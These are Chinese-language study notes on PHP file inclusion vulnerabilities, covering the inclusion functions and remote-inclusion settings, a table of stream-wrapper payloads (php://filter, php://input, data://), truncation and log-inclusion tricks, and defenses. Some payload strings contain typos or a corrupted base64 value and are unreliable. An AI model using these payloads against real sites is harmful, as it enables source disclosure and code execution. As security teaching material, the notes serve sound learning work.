# 文件包含漏洞
### 文件包含函数
* include
* include_once
* require
* require_once
* highlight_file、show_source、readfile、file_get_contents、fopen、file
### 文件包含漏洞分类
* 本地文件包含
* 远程文件包含
* allow_url_fopen:为on时，能读取远程文件，例如:file_get_contents()就能读取远程文件。
* allow_url_include: 为on时，就可以使用include和require等方式包含远程文件

## 文件包含漏洞的利用方式-伪协议

**测试PHP版本>=5.2**

| 协议              | allow_url_fopen | allow_url_include | 用法                                                         |
| ----------------- | --------------- | ----------------- | ------------------------------------------------------------ |
| file://           | off/on          | off/on            | ?file=file://D:/phpcode.text                                 |
| php://filter      | off/on          | off/on            | ?file=php://fileter/read=convert.base64-encode/resource=./index.php |
| php://input       | off/on          | **on**            | ?file=php://input <?php phpinfo()?>                          |
| zip://            | off/on          | off/on            | ?file=zip://D:/file.zip%23phpcode.text                       |
| compress.bzip2:// | off/on          | off/on            | ?file=conpress.bzip2://D://file.bz2\|?file=compress.bzip2://./file.bz2 |
| compress.zlib://  | off/on          | off/on            | ?file=conpress.zlib://D://file.gz                            |
| data://           | **on**          | **on**            | ?file=data://text/plain,<? php phpinfo()?>\|?file=data://text/plain;base64,PD9waHagcGhwaW5mbygpPz4=\|?file=data:text/plain,<? php phpinfo()?>\|?file=data:text/plain;base64,PD9waHagcGhwaW5mbygpPz4= |

php://filter是一种原封装器，设计用于数据流打开时的筛选过滤应用

data://同样类似与php://input，可以让用户来控制输入流

php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行

phar://xxx.png/shell.php解压缩包的一个函数，不管后缀是什么，都会当作压缩包来解压

## 文件包含漏洞的利用方式-其他

* 00截断
* 长度截断
* 包含日志文件
  * Windows：256
  * Linux：4096
* 包含session

### 文件包含的防御

* PHP中使用open_basedir配置限制访问在指定的区域
* 过滤.(点)/(斜杠)\\(反斜杠)
* 禁止服务器远程文件包含
* 尽量不要使用动态包含，可以在需要包含的页面固定写好